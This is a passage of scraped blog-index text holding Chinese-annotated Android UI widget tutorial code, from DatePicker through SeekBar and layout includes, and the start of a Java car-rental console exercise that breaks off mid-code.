minute); 设置标题栏 datePicker.init(year, calendar.get(Calendar.MONTH), day, new DatePicker.OnDateChangedListener() { 日期选择器（年，月，日，监听器） @Override public void onDateChanged(DatePicker view, int year, int monthOfYear, int dayOfMonth) { setTitle(year + \u0026#34;-\u0026#34; + (monthOfYear + 1) + \u0026#34;-\u0026#34; + dayOfMonth); } }); timePicker.setOnTimeChangedListener(new TimePicker.OnTimeChangedListener() { 时间选择器（监听器） @Override public void onTimeChanged(TimePicker view, int hourOfDay, int minute) { setTitle(hourOfDay + \u0026#34;:\u0026#34; + minute); } }); new DatePickerDialog(this, new DatePickerDialog.OnDateSetListener() { 对话框形式的日期选择器（上下文对象，监听器，年，月，日）.show() @Override public void onDateSet(DatePicker view, int year, int monthOfYear, int dayOfMonth) { setTitle(year + \u0026#34;-\u0026#34; + (monthOfYear + 1) + \u0026#34;-\u0026#34; + dayOfMonth); } }, year, calendar.get(Calendar.MONTH), day).show(); new TimePickerDialog(this, new TimePickerDialog.OnTimeSetListener() { 对话框形式的时间选择器（上下文对象，监听器，小时，分钟，是否为24小时制）.show() @Override public void onTimeSet(TimePicker view, int hourOfDay, int minute) { setTitle(hourOfDay + \u0026#34;:\u0026#34; + minute); } }, hour, minute, true).show(); } } ------------------------------------------------------- GridView 布局文件 main_activity.xml ⇳ \u0026lt;GridView android:numColumns=\u0026#34;3\u0026#34; 一行三列，可以设置自适应 auto_fit android:horizontalSpacing=\u0026#34;10dp\u0026#34; 列间距 android:verticalSpacing=\u0026#34;10dp\u0026#34; 行间距 android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/gridView\u0026#34;/\u0026gt; item.xml 简单适配器的自定义布局文件 ⇳ LinearLayout ⟺ android:gravity=\u0026#34;center\u0026#34; 整体居中 \u0026lt;ImageView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:src=\u0026#34;@mipmap/ic_launcher\u0026#34; android:id=\u0026#34;@+id/imageView\u0026#34;/\u0026gt; \u0026lt;TextView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Test\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; ---- Activity 文件 public class MainActivity extends AppCompatActivity implements AdapterView.OnItemClickListener { @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); GridView gridView = (GridView) findViewById(R.id.gridView); 1控件 SimpleAdapter simpleAdapter = new SimpleAdapter(this, getdata(), R.layout.item, new String[]{\u0026#34;image\u0026#34;, \u0026#34;text\u0026#34;}, new int[]{R.id.imageView, R.id.textView}); gridView.setAdapter(simpleAdapter); 3将控件与适配器绑定 ↳ 2简单适配器（上下文对象，数据源，布局文件，索引(Map中的键名)，绑定控件ID(与索引成对应关系)） gridView.setOnItemClickListener(this); 监听点击条目 } private List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; getdata() { 数据源 List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; data = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; 9; i++) { Map\u0026lt;String, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;image\u0026#34;, R.mipmap.ic_launcher); map.put(\u0026#34;text\u0026#34;, \u0026#34;文本\u0026#34; + i); data.add(map); } return data; } @Override public void onItemClick(AdapterView\u0026lt;?\u0026gt; parent, View view, int position, long id) { Log.i(\u0026#34;Tag\u0026#34;, parent + \u0026#34;\\n\u0026#34; + view + \u0026#34;\\n\u0026#34; + position + \u0026#34;\\n\u0026#34; + id); Log.i(\u0026#34;Tag\u0026#34;, ((TextView) view.findViewById(R.id.textView)).getText().toString()); 获得点击条目中的控件 } } ------------------------------------------------------- Spinner 布局文件 main_activity.xml ⇳ \u0026lt;Spinner android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/spinner\u0026#34;/\u0026gt; \u0026lt;TextView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;New Text\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; item.xml 简单适配器的自定义布局文件 ⇳ LinearLayout ⟺ android:orientation=\u0026#34;horizontal\u0026#34; 横向排列 \u0026lt;ImageView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:src=\u0026#34;@mipmap/ic_launcher\u0026#34; android:id=\u0026#34;@+id/imageView\u0026#34;/\u0026gt; \u0026lt;TextView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Test\u0026#34; android:id=\u0026#34;@+id/textView2\u0026#34;/\u0026gt; ---- Activity 文件 public class MainActivity extends AppCompatActivity implements AdapterView.OnItemSelectedListener { private String[] strings = {\u0026#34;文本1\u0026#34;, \u0026#34;文本2\u0026#34;, \u0026#34;文本3\u0026#34;, \u0026#34;文本4\u0026#34;,}; 数据源 private TextView textView; private Spinner spinner; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); textView = (TextView) findViewById(R.id.textView); spinner = (Spinner) findViewById(R.id.spinner); 1控件 ArrayAdapter\u0026lt;String\u0026gt; arrayAdapter = new ArrayAdapter\u0026lt;\u0026gt;(this, android.R.layout.simple_spinner_item, strings); 2数组适配器 arrayAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item); 设置下拉样式 spinner.setAdapter(arrayAdapter); 3将控件与适配器绑定 SimpleAdapter simpleAdapter = new SimpleAdapter(this, getdata(), R.layout.item, new String[]{\u0026#34;image\u0026#34;, \u0026#34;text\u0026#34;}, new int[]{R.id.imageView, R.id.textView2}); 2简单适配器 simpleAdapter.setDropDownViewResource(R.layout.item); 设置下拉样式 spinner.setAdapter(simpleAdapter); 3将控件与适配器绑定 spinner.setOnItemSelectedListener(this); 监听器 } private List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; getdata() { 数据源 List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; data = new ArrayList\u0026lt;\u0026gt;(); for (String string : strings) { Map\u0026lt;String, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;image\u0026#34;, R.mipmap.ic_launcher); map.put(\u0026#34;text\u0026#34;, string); data.add(map); } return data; } @Override public void onItemSelected(AdapterView\u0026lt;?\u0026gt; parent, View view, int position, long id) { textView.setText(position + \u0026#34;\\n\u0026#34; + ((TextView) view.findViewById(R.id.textView2)).getText().toString()); } ↳ 显示索引位置并且获得点击条目中的控件 @Override public void onNothingSelected(AdapterView\u0026lt;?\u0026gt; parent) { } } ------------------------------------------------------- ProgressBar 布局文件 main_activity.xml ⇳ \u0026lt;ProgressBar android:progressDrawable=\u0026#34;@drawable/progressbar\u0026#34; 覆盖系统自带的样式（可选） android:secondaryProgress=\u0026#34;60\u0026#34; 第二进度条 android:progress=\u0026#34;30\u0026#34; 第一进度条 android:max=\u0026#34;100\u0026#34; 最大进度条 android:indeterminate=\u0026#34;false\u0026#34; 设置为精确进度 style=\u0026#34;?android:attr/progressBarStyleHorizontal\u0026#34; 设置为水平进度条 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/progressBar\u0026#34;/\u0026gt; \u0026lt;Button android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;增加\u0026#34; android:id=\u0026#34;@+id/increase\u0026#34;/\u0026gt; \u0026lt;Button android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;减少\u0026#34; android:id=\u0026#34;@+id/decrease\u0026#34;/\u0026gt; \u0026lt;Button android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;重置\u0026#34; android:id=\u0026#34;@+id/reset\u0026#34;/\u0026gt; \u0026lt;Button android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;对话框形式\u0026#34; android:id=\u0026#34;@+id/dialog\u0026#34;/\u0026gt; \u0026lt;TextView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;New Text\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; progressbar.xml 自定义进度条样式 ⇳ \u0026lt;layer-list xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;item android:id=\u0026#34;@android:id/background\u0026#34;\u0026gt; 最大进度条 \u0026lt;shape\u0026gt; \u0026lt;solid android:color=\u0026#34;#ff9d9e9d\u0026#34;/\u0026gt; 填充色 \u0026lt;/shape\u0026gt; \u0026lt;/item\u0026gt; \u0026lt;item android:id=\u0026#34;@android:id/secondaryProgress\u0026#34;\u0026gt; 第二进度条 \u0026lt;clip\u0026gt; \u0026lt;shape\u0026gt; \u0026lt;solid android:color=\u0026#34;#008a9f\u0026#34;/\u0026gt; \u0026lt;/shape\u0026gt; \u0026lt;/clip\u0026gt; \u0026lt;/item\u0026gt; \u0026lt;item android:id=\u0026#34;@android:id/progress\u0026#34;\u0026gt; 第一进度条 \u0026lt;clip\u0026gt; \u0026lt;shape\u0026gt; \u0026lt;solid android:color=\u0026#34;#00ddff\u0026#34;/\u0026gt; \u0026lt;/shape\u0026gt; \u0026lt;/clip\u0026gt; \u0026lt;/item\u0026gt; \u0026lt;/layer-list\u0026gt; ---- Activity 文件 public class MainActivity extends AppCompatActivity implements View.OnClickListener { private ProgressBar progressBar; private Button btn_increase; private Button btn_decrease; private Button btn_reset; private Button btn_dialog; private TextView textView; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); progressBar = (ProgressBar) findViewById(R.id.progressBar); btn_increase = (Button) findViewById(R.id.increase); btn_decrease = (Button) findViewById(R.id.decrease); btn_reset = (Button) findViewById(R.id.reset); btn_dialog = (Button) findViewById(R.id.dialog); textView = (TextView) findViewById(R.id.textView); btn_increase.setOnClickListener(this); btn_decrease.setOnClickListener(this); btn_reset.setOnClickListener(this); btn_dialog.setOnClickListener(this); textView.setText(\u0026#34;第一进度条：\u0026#34; + progressBar.getProgress() + \u0026#34;%第二进度条：\u0026#34; + progressBar.getSecondaryProgress() + \u0026#34;%最大进度条：\u0026#34; + progressBar.getMax()); } ↳ 获取进度 @Override public void onClick(View v) { switch (v.getId()) { case R.id.increase: progressBar.incrementProgressBy(10); 改变进度 progressBar.incrementSecondaryProgressBy(10); break; case R.id.decrease: progressBar.incrementProgressBy(-10); 改变进度 progressBar.incrementSecondaryProgressBy(-10); break; case R.id.reset: progressBar.setProgress(30); 设置进度 progressBar.setSecondaryProgress(60); break; case R.id.dialog: ProgressDialog progressDialog = new ProgressDialog(this); 实例化对话框 progressDialog.setTitle(\u0026#34;对话框标题\u0026#34;); progressDialog.setMessage(\u0026#34;对话框信息\u0026#34;); progressDialog.setIcon(R.mipmap.ic_launcher); 对话框图标 progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL); 设置为水平进度条 progressDialog.setIndeterminate(false); 设置为精确进度 progressDialog.setMax(100); 设置最大进度 progressDialog.incrementProgressBy(30); 改变进度 progressDialog.setButton(DialogInterface.BUTTON_POSITIVE, \u0026#34;确定\u0026#34;, new DialogInterface.OnClickListener() { 确定按钮 @Override public void onClick(DialogInterface dialog, int which) { Toast.makeText(MainActivity.this, \u0026#34;已确定\u0026#34;, Toast.LENGTH_SHORT).show(); } }); progressDialog.setButton(DialogInterface.BUTTON_NEGATIVE, \u0026#34;取消\u0026#34;, new DialogInterface.OnClickListener() { 取消按钮 @Override public void onClick(DialogInterface dialog, int which) { Toast.makeText(MainActivity.this, \u0026#34;已取消\u0026#34;, Toast.LENGTH_SHORT).show(); } }); progressDialog.setCancelable(false); 不可以通过返回按钮退出对话框 progressDialog.show(); 显示对话框 break; } textView.setText(\u0026#34;第一进度条：\u0026#34; + progressBar.getProgress() + \u0026#34;%第二进度条：\u0026#34; + progressBar.getSecondaryProgress() + \u0026#34;%最大进度条：\u0026#34; + progressBar.getMax()); } } ------------------------------------------------------- WebView 布局文件 main_activity.xml \u0026lt;WebView android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/webView\u0026#34;/\u0026gt; 配置文件 AndroidManifest.xml \u0026lt;uses-permission android:name=\u0026#34;android.permission.INTERNET\u0026#34;/\u0026gt; 网络访问权限 ---- Activity 文件 public class MainActivity extends AppCompatActivity { private WebView webView; private ProgressDialog progressDialog; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); webView = (WebView) findViewById(R.id.webView); webView.loadUrl(\u0026#34;https://www.bing.com/\u0026#34;); 加载 Web 页面 webView.loadUrl(\u0026#34;file:///android_asset/example.html\u0026#34;); 加载本地页面 webView.setWebViewClient(new WebViewClient() { @Override public boolean shouldOverrideUrlLoading(WebView view, String url) { 不使用外部游览器打开页面 view.loadUrl(url); return true; } }); webView.setWebChromeClient(new WebChromeClient() { @Override public void onProgressChanged(WebView view, int newProgress) { 弹出 ProgressDialog 显示页面加载进度 if (newProgress == 100) { if (progressDialog != null \u0026amp;\u0026amp; progressDialog.isShowing()) { progressDialog.dismiss(); 关闭对话框 progressDialog = null; } } else { if (progressDialog == null) { progressDialog = new ProgressDialog(MainActivity.this); progressDialog.setTitle(\u0026#34;正在加载\u0026#34;); progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL); progressDialog.setProgress(newProgress); progressDialog.show(); 显示对话框 } else { progressDialog.setProgress(newProgress); } } } }); WebSettings settings = webView.getSettings(); 获得 WebSettings 对象 settings.setJavaScriptEnabled(true); 启用 JavaScript settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); 优先使用缓存 } @Override public boolean onKeyDown(int keyCode, KeyEvent event) { if (keyCode == KeyEvent.KEYCODE_BACK) { 判断是否为返回键 if (webView.canGoBack()) { webView.goBack(); 返回上一页面 return true; 消耗掉事件 } else { finish(); 结束当前 Activity } } return super.onKeyDown(keyCode, event); } } ------------------------------------------------------- ViewFlipper 布局文件 main_activity.xml \u0026lt;ViewFlipper android:id=\u0026#34;@+id/viewFlipper\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;/ViewFlipper\u0026gt; ---- Activity 文件 public class MainActivity extends Activity implements View.OnTouchListener { private ViewFlipper viewFlipper; private float startX; 起始X轴坐标 @Override protected void onCreate(@Nullable final Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); viewFlipper = (ViewFlipper) findViewById(R.id.viewFlipper); viewFlipper.addView(getImageView(R.mipmap.ic_launcher)); 动态导入页面 viewFlipper.addView(getImageView(R.mipmap.ic_launcher)); viewFlipper.addView(getImageView(R.mipmap.ic_launcher)); viewFlipper.setInAnimation(this, R.anim.left_in); 设置进入动画 viewFlipper.setOutAnimation(this, R.anim.left_out); 设置退出动画 viewFlipper.setFlipInterval(2000); 设置切换页面的间隔为 2s viewFlipper.startFlipping(); 第一种：页面轮播 viewFlipper.setOnTouchListener(this); 第二种：手势切换（设置监听器） } private ImageView getImageView(int resID) { 获得 ImageView ImageView imageView = new ImageView(this); imageView.setImageResource(resID); 内容图片 imageView.setBackgroundResource(resID); 背景图片 return imageView; } @Override public boolean onTouch(View v, MotionEvent event) { switch (event.getAction()) { case MotionEvent.ACTION_DOWN: 1手指按下 startX = event.getX(); 获得起始X轴坐标 break; case MotionEvent.ACTION_MOVE: 2手指滑动 break; case MotionEvent.ACTION_UP: 3手指离开 if (event.getX() - startX \u0026gt; 100) { 向右滑动看前一页面 viewFlipper.setInAnimation(MainActivity.this, R.anim.left_in); viewFlipper.setOutAnimation(MainActivity.this, R.anim.left_out); viewFlipper.showPrevious(); 显示前一页 } if (startX - event.getX() \u0026gt; 100) { 向左滑动看后一页 viewFlipper.setInAnimation(MainActivity.this, R.anim.right_in); viewFlipper.setOutAnimation(MainActivity.this, R.anim.right_out); viewFlipper.showNext(); 显示后一页 } break; } return true; 消耗掉事件 } } ------------------------------------------------------- ScrollView 布局文件 main_activity.xml \u0026lt;Button android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Up\u0026#34; android:id=\u0026#34;@+id/button\u0026#34;/\u0026gt; \u0026lt;Button android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;Down\u0026#34; android:id=\u0026#34;@+id/button2\u0026#34;/\u0026gt; \u0026lt;ScrollView android:scrollbars=\u0026#34;none\u0026#34; 不显示滚动条 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/scrollView\u0026#34;\u0026gt; \u0026lt;TextView android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; \u0026lt;/ScrollView\u0026gt; ---- Activity 文件 public class MainActivity extends Activity implements View.OnTouchListener, View.OnClickListener { private ScrollView scrollView; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); TextView textView = (TextView) findViewById(R.id.textView); textView.setText(getResources().getString(R.string.text)); 获得 strings.xml 里的资源 text scrollView = (ScrollView) findViewById(R.id.scrollView); Button up = (Button) findViewById(R.id.button); Button down = (Button) findViewById(R.id.button2); scrollView.setOnTouchListener(this); 监听器 up.setOnClickListener(this); 监听器 down.setOnClickListener(this); 监听器 scrollView.setHorizontalScrollBarEnabled(false); 不显示横向滚动条 scrollView.setVerticalScrollBarEnabled(false); 不显示纵向滚动条 } @Override public boolean onTouch(View v, MotionEvent event) { switch (event.getAction()) { case MotionEvent.ACTION_DOWN: 1手指按下 break; case MotionEvent.ACTION_MOVE: 2手指移动 break; case MotionEvent.ACTION_UP: 3手指离开 if (scrollView.getScrollY() == 0) { 滚动距离为 0 时 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;在顶部\u0026#34;); } if (scrollView.getScrollY() + scrollView.getHeight() == scrollView.getChildAt(0).getHeight()) { 滚动距离+父容器高度(屏幕高度)=子控件高度 时 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;在底部\u0026#34;); ((TextView) this.findViewById(R.id.textView)).append(getResources().getString(R.string.string)); 追加文本 } break; } return false; 不消耗事件，让 TextView 得以滚动 } @Override public void onClick(View v) { switch (v.getId()) { case R.id.button: scrollView.scrollBy(0, -30); 向上滚动 30 break; case R.id.button2: scrollView.scrollBy(0, 30); 向下滚动 30 break; } } } ------------------------------------------------------- Gallery + ImageSwitcher 布局文件 main_activity.xml \u0026lt;Gallery android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/gallery\u0026#34;/\u0026gt; \u0026lt;ImageSwitcher android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:id=\u0026#34;@+id/imageSwitcher\u0026#34;/\u0026gt; ---- Activity 文件 public class MainActivity extends Activity implements AdapterView.OnItemSelectedListener, ViewSwitcher.ViewFactory { private int[] res = {R.mipmap.ic_launcher, R.mipmap.ic_launcher, R.mipmap.ic_launcher}; 数据源 private ImageSwitcher imageSwitcher; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); Gallery gallery = (Gallery) findViewById(R.id.gallery); 1控件 MyBaseAdapter myBaseAdapter = new MyBaseAdapter(this, res); 2自定义适配器（上下文对象，数据源） gallery.setAdapter(myBaseAdapter); 3将控件与适配器绑定 gallery.setOnItemSelectedListener(this); 加载监听器 imageSwitcher = (ImageSwitcher) findViewById(R.id.imageSwitcher); imageSwitcher.setFactory(this); 加载 ViewFactory，实现 makeView() 方法 imageSwitcher.setInAnimation(AnimationUtils.loadAnimation(this, android.R.anim.fade_in)); 设置进入动画 imageSwitcher.setOutAnimation(AnimationUtils.loadAnimation(this, android.R.anim.fade_out)); 设置退出动画 } @Override public void onItemSelected(AdapterView\u0026lt;?\u0026gt; parent, View view, int position, long id) { imageSwitcher.setBackgroundResource(res[position]); 设置背景图片 // imageSwitcher.setBackgroundResource(res[position % res.length]); 循环页面 } @Override public void onNothingSelected(AdapterView\u0026lt;?\u0026gt; parent) { } @Override public View makeView() { 创建 View ImageView imageView = new ImageView(this); imageView.setScaleType(ImageView.ScaleType.FIT_CENTER); 设置图片缩放模式为等比例缩放并居中 return imageView; } } ---- public class MyBaseAdapter extends BaseAdapter { 自定义适配器 private Context context; 上下文对象 private int[] res; 数据源 public MyBaseAdapter(Context context, int[] res) { 构造方法 this.context = context; this.res = res; } @Override public int getCount() { 获得页面数量 return res.length; // return Integer.MAX_VALUE; 循环页面 } @Override public Object getItem(int position) { 获得数据对象 return res[position]; } @Override public long getItemId(int position) { 获得数据ID return position; } @Override public View getView(int position, View convertView, ViewGroup parent) { 获得页面 ImageView imageView = new ImageView(context); imageView.setBackgroundResource(res[position]); 设置背景图片 // imageView.setBackgroundResource(res[position % res.length]); 循环页面 imageView.setLayoutParams(new ViewGroup.LayoutParams(400, 300)); 设置控件宽高 imageView.setScaleType(ImageView.ScaleType.FIT_XY); 设置图片缩放模式为铺满控件 return imageView; } } ------------------------------------------------------- SeekBar 布局文件 main_activity.xml ⇳ \u0026lt;SeekBar android:progressDrawable=\u0026#34;@drawable/progressbar\u0026#34; 覆盖系统自带的样式（可选） android:thumb=\u0026#34;@drawable/seekbar_thumb\u0026#34; 覆盖系统自带的样式（可选） android:progress=\u0026#34;50\u0026#34; 第一进度条 android:max=\u0026#34;100\u0026#34; 最大进度条 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/seekBar\u0026#34;/\u0026gt; seekbar_thumb.xml 自定义拖动按钮样式 ⇳ \u0026lt;selector xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; 选择器 \u0026lt;item android:state_pressed=\u0026#34;true\u0026#34; android:state_window_focused=\u0026#34;true\u0026#34; android:drawable=\u0026#34;@mipmap/ic_launcher\u0026#34;/\u0026gt; 按下 \u0026lt;item android:state_focused=\u0026#34;true\u0026#34; android:state_window_focused=\u0026#34;true\u0026#34; android:drawable=\u0026#34;@mipmap/ic_launcher\u0026#34;/\u0026gt; 焦点 \u0026lt;item android:state_selected=\u0026#34;true\u0026#34; android:state_window_focused=\u0026#34;true\u0026#34; android:drawable=\u0026#34;@mipmap/ic_launcher\u0026#34;/\u0026gt; 选中 \u0026lt;item android:drawable=\u0026#34;@mipmap/ic_launcher\u0026#34;/\u0026gt; 默认 \u0026lt;/selector\u0026gt; ---- Activity 文件 public class MainActivity extends Activity implements SeekBar.OnSeekBarChangeListener { @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); SeekBar seekBar = (SeekBar) findViewById(R.id.seekBar); seekBar.setOnSeekBarChangeListener(this); 设置监听器 } @Override public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;2正在拖动:\u0026#34; + String.valueOf(progress)); } @Override public void onStartTrackingTouch(SeekBar seekBar) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;1开始拖动\u0026#34;); } @Override public void onStopTrackingTouch(SeekBar seekBar) { Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;3停止拖动\u0026#34;); } } android:visibility=\u0026#34;visible\u0026#34; 可见 button.setVisibility(View.VISIBLE); ---- android:visibility=\u0026#34;invisible\u0026#34; 隐形（不可见，占据空间） button.setVisibility(View.INVISIBLE); ---- android:visibility=\u0026#34;gone\u0026#34; 隐藏（不可见，释放空间） button.setVisibility(View.GONE); ------------------------------------------------------- include 导入布局 ---- \u0026lt;include layout=\u0026#34;@layout/common_title\u0026#34;/\u0026gt; 导入的布局 merge 忽略顶节点，直接导入子控件 ---- \u0026lt;merge xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; 忽略 android:orientation=\u0026#34;vertical\u0026#34; 忽略 android:layout_width=\u0026#34;match_parent\u0026#34; 忽略 android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; 忽略 \u0026lt;ProgressBar android:layout_centerInParent=\u0026#34;true\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;TextView android:text=\u0026#34;请稍后\u0026#34; android:layout_centerInParent=\u0026#34;true\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;/merge\u0026gt; ViewStub 导入布局（惰性加载） ---- \u0026lt;ViewStub android:layout=\u0026#34;@layout/common_title\u0026#34; 导入的布局 android:layout_height=\u0026#34;wrap_content\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/viewStub\u0026#34;/\u0026gt; ---- viewStub.setOnInflateListener() 设置加载时的监听器（可选） View view = viewStub.inflate(); 开始加载并接收实例化的布局 View ------------------------------------------------------- RadioButton 做出 TAB 效果 布局文件 \u0026lt;RadioButton android:checked=\u0026#34;true\u0026#34; 默认选中 android:drawableTop=\u0026#34;@mipmap/ic_launcher\u0026#34; 放置图片 android:background=\u0026#34;@drawable/button\u0026#34; 背景样式 android:button=\u0026#34;@null\u0026#34; 无按钮样式 android:gravity=\u0026#34;center\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;TAB\u0026#34; android:id=\u0026#34;@+id/radioButton\u0026#34;/\u0026gt; 背景样式 (button.xml) \u0026lt;selector xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; 选择器 \u0026lt;item android:drawable=\u0026#34;@color/gray\u0026#34; android:state_checked=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;item android:drawable=\u0026#34;@color/white\u0026#34;/\u0026gt; \u0026lt;/selector\u0026gt; Maven0, Maven1, Maven2, Maven3, JCenter, Mirror\nCache： Android USB Driver： ","permalink":"https://xhstormr.github.io/blog/posts/android/","summary":"","title":"自学 Android"},{"content":"Updated on 2016-07-02\n分别创建了三个类：车类(Car)、方法类(Method)、入口类(Initial)\nCar.java class Car { private String name; private int rent; private int mannedNum; private int goodsNum; Car(String name, int rent, int mannedNum, int goodsNum) { this.name = name; this.rent = rent; this.mannedNum = mannedNum; this.goodsNum = goodsNum; } String getName() { return name; } int getRent() { return rent; } int getMannedNum() { return mannedNum; } int getGoodsNum() { return goodsNum; } @Override public String toString() { String str1 = mannedNum != 0 ? \u0026#34;载人:\u0026#34; + mannedNum + \u0026#34;人\u0026#34; + \u0026#34;\\t\u0026#34; : \u0026#34;\u0026#34;; String str2 = goodsNum != 0 ? \u0026#34;载货:\u0026#34; + goodsNum + \u0026#34;吨\u0026#34; : \u0026#34;\u0026#34;; return name + \u0026#34;\\t\\t\u0026#34; + rent + \u0026#34;元/天\\t\\t\u0026#34; + str1 + str2; } } Method.java import java.util.Scanner; class Method { private static Scanner scan = new Scanner(System.in); static Car[] generateCars() { Car[] cars = new Car[3]; cars[0] = new Car(\u0026#34;奥迪A4\u0026#34;, 500, 4, 0); cars[1] = new Car(\u0026#34;皮卡雪\u0026#34;, 700, 4, 2); cars[2] = new Car(\u0026#34;松花江\u0026#34;, 900, 0, 10); return cars; } static void displayList(Car[] cars) { System.out.println(\u0026#34;欢迎使用,你可租车的类型及其价目表:\u0026#34;); System.out.println(\u0026#34;序号\\t名称\\t\\t\\t租金\\t\\t\\t\\t容量\u0026#34;); for (int i = 0; i \u0026lt; cars.length; i++) { System.out.println((i + 1) + \u0026#34;\\t\\t\u0026#34; + cars[i]); } } static int getCarNum() { int carNum = 0; for (; carNum \u0026lt;= 0 || carNum \u0026gt;= 11; ) { System.out.println(\u0026#34;请输入你要租车的数量(1-10):\u0026#34;); carNum = scan.nextInt(); } return carNum; } static int getCarDay() { int carDay = 0; for (; carDay \u0026lt;= 0 || carDay \u0026gt;= 11; ) { System.out.println(\u0026#34;请输入你要租车的天数(1-10):\u0026#34;); carDay = scan.nextInt(); } return carDay; } static int[] getCarList(int carNum, Car[] cars) { int[] carList = new int[carNum]; for (int i = 0; i \u0026lt; carList.length; i++) { int j = -1; for (; j \u0026lt; 0 || j \u0026gt; cars.length; ) { System.out.println(\u0026#34;请输入第\u0026#34; + (i + 1) + \u0026#34;辆车的序号:\u0026#34;); j = scan.nextInt(); } carList[i] = j - 1; } return carList; } static void generateBill(Car[] cars, int[] carList, int carDay) { int sum = 0; int mannedNum = 0; int goodsNum = 0; String car = \u0026#34;\u0026#34;; String truck = \u0026#34;\u0026#34;; for (int i : carList) { sum += cars[i].getRent(); if (cars[i].getMannedNum() != 0) { 